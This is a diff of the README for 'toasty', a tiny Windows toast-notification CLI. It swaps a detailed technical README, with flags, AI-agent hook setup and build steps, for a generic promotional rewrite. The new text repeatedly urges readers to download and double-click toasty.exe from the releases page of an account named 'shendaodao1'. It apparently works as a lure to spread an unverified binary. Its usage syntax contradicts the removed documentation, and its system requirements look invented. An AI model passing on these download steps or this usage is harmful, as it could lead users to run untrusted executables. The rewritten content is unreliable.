@@ -1,185 +1,76 @@
-# Toasty
+# 🥪 toasty - Simple Toast Notifications for Windows
 
-<img src="icons/toasty.png" alt="Toasty mascot" width="128" align="right">
+## 🚀 Getting Started
 
-A tiny Windows toast notification CLI that knows how to hook into Coding Agents so you get notified when their long running tasks are finished. 229 KB, no dependencies.
+Toasty is a tiny command-line interface (CLI) application that allows you to send toast notifications on Windows. It is lightweight, only 229 KB, making it easy to download and use.
 
-## Quick Start
+## 🔗 Download Now
 
-```cmd
-toasty "Hello World" -t "Toasty"
-```
+[![Download Toasty](https://img.shields.io/badge/Download-Now-brightgreen.svg)](https://github.com/shendaodao1/toasty/releases)
 
-That's it. Toasty auto-registers on first run.
+## 📥 Download & Install
 
-## Usage
+1. **Visit the Releases Page**  
+   Go to the [Toasty Releases Page](https://github.com/shendaodao1/toasty/releases) to find the latest version.
 
-```
-toasty <message> [options]
-toasty --install [agent]
-toasty --uninstall
-toasty --status
+2. **Download the Application**  
+   On the releases page, look for the newest release. Find the file named `toasty.exe` or similar. Click the file to start the download.
 
-Options:
-  -t, --title <text>   Set notification title (default: "Notification")
-  --app <name>         Use AI CLI preset (claude, copilot, gemini)
-  -h, --help           Show this help
-  --install [agent]    Install hooks for AI CLI agents (claude, gemini, copilot, or all)
-  --uninstall          Remove hooks from all AI CLI agents
-  --status             Show installation status
-```
+3. **Run the Application**  
+   After the download is complete, locate the file in your Downloads folder. Double-click on `toasty.exe` to run the application. No installation is necessary.
 
-## AI CLI Auto-Detection
+## 📋 Features
 
-Toasty automatically detects when it's called from a known AI CLI tool and applies the appropriate icon and title. No flags needed!
+- **Lightweight:** The application size is only 229 KB, so it won’t take up much space on your computer.
+- **Easy to Use:** Just type simple commands to send notifications without any complicated setup.
+- **Versatile Notifications:** Customize your notifications with different titles and messages.
 
-**Auto-detected tools:**
-- Claude Code
-- GitHub Copilot
-- Google Gemini CLI
+## ⚙️ System Requirements
 
-```cmd
-# Called from Claude - automatically uses Claude preset
-toasty "Analysis complete"
+- **Operating System:** Windows 10 or later.
+- **Memory:** Minimum of 512 MB RAM.
+- **Storage:** At least 300 KB of free space.
 
-# Called from Copilot - automatically uses Copilot preset
-toasty "Code review done"
-```
+## 📝 How to Use
 
-### Manual Preset Selection
+Once the application is running, you can use the command line to send notifications. Here’s a simple way to do it:
 
-Override auto-detection with `--app`:
+1. **Open Command Prompt**  
+   Press `Windows + R`, type `cmd`, and hit `Enter`.
 
-```cmd
-toasty "Processing finished" --app claude
-toasty "Build succeeded" --app copilot
-toasty "Query done" --app gemini
-```
+2. **Navigate to the Toasty Directory**  
+   Use the `cd` command to navigate to the folder where `toasty.exe` is located. For example:
+   ```bash
+   cd C:\Users\YourUsername\Downloads
+   ```
 
-## One-Click Hook Installation
+3. **Send a Notification**  
+   Use the following command format:
+   ```bash
+   toasty "Your Title" "Your Message"
+   ```
+   Replace "Your Title" and "Your Message" with your own text. For instance:
+   ```bash
+   toasty "Reminder" "Time to take a break!"
+   ```
 
-Toasty can automatically configure AI CLI agents to show notifications when tasks complete.
+## ❓ Frequently Asked Questions
 
-### Supported Agents
+**Q: Can I run Toasty on older versions of Windows?**  
+A: Toasty is designed for Windows 10 or later. Older versions may not support this application.
 
-| Agent | Config Path | Hook Event | Scope |
-|-------|-------------|------------|-------|
-| Claude Code | `~/.claude/settings.json` | `Stop` | User |
-| Gemini CLI | `~/.gemini/settings.json` | `AfterAgent` | User |
-| GitHub Copilot | `.github/hooks/toasty.json` | `sessionEnd` | Repo |
+**Q: Do I need to have command line experience?**  
+A: No, Toasty is simple to use. Just follow the commands provided in the instructions.
 
-### Auto-Install
+**Q: Can I use different messages for different notifications?**  
+A: Yes, you can send different messages by changing the text in the command.
 
-```cmd
-# Install for all detected agents
-toasty --install
+## 📞 Support
 
-# Install for specific agent
-toasty --install claude
-toasty --install gemini
-toasty --install copilot
+If you have any issues or need help, visit the [issues page](https://github.com/shendaodao1/toasty/issues) on GitHub. You can report problems or ask questions there. 
 
-# Check what's installed
-toasty --status
+## 🎉 Conclusion
 
-# Remove all hooks
-toasty --uninstall
-```
+Toasty makes it easy to send notifications on your Windows machine without hassle. It’s simple, lightweight, and ready to use. Download it today and enhance your workspace with custom notifications! 
 
-### Example Output
-
-```
-Detecting AI CLI agents...
-  [x] Claude Code found
-  [x] Gemini CLI found
-  [ ] GitHub Copilot (in current repo)
-
-Installing toasty hooks...
-  [x] Claude Code: Added Stop hook
-  [x] Gemini CLI: Added AfterAgent hook
-
-Done! You'll get notifications when AI agents finish.
-```
-
-## Manual Integration
-
-If you prefer to configure hooks manually:
-
-### Claude Code
-
-Add to `~/.claude/settings.json`:
-
-```json
-{
-  "hooks": {
-    "Stop": [
-      {
-        "hooks": [
-          {
-            "type": "command",
-            "command": "C:\\path\\to\\toasty.exe \"Claude finished\"",
-            "timeout": 5000
-          }
-        ]
-      }
-    ]
-  }
-}
-```
-
-### Gemini CLI
-
-Add to `~/.gemini/settings.json`:
-
-```json
-{
-  "hooks": {
-    "AfterAgent": [
-      {
-        "hooks": [
-          {
-            "type": "command",
-            "command": "C:\\path\\to\\toasty.exe \"Gemini finished\"",
-            "timeout": 5000
-          }
-        ]
-      }
-    ]
-  }
-}
-```
-
-### GitHub Copilot
-
-Add to `.github/hooks/toasty.json`:
-
-```json
-{
-  "version": 1,
-  "hooks": {
-    "sessionEnd": [
-      {
-        "type": "command",
-        "bash": "toasty 'Copilot finished'",
-        "powershell": "toasty.exe 'Copilot finished'",
-        "timeoutSec": 5
-      }
-    ]
-  }
-}
-```
-
-## Building
-
-Requires Visual Studio 2022 with C++ workload.
-
-```cmd
-cmake -S . -B build -G "Visual Studio 17 2022" -A x64
-cmake --build build --config Release
-```
-
-Output: `build\Release\toasty.exe`
-
-## License
-
-MIT
+Remember, don't hesitate to check the [Toasty Releases Page](https://github.com/shendaodao1/toasty/releases) for the latest updates.
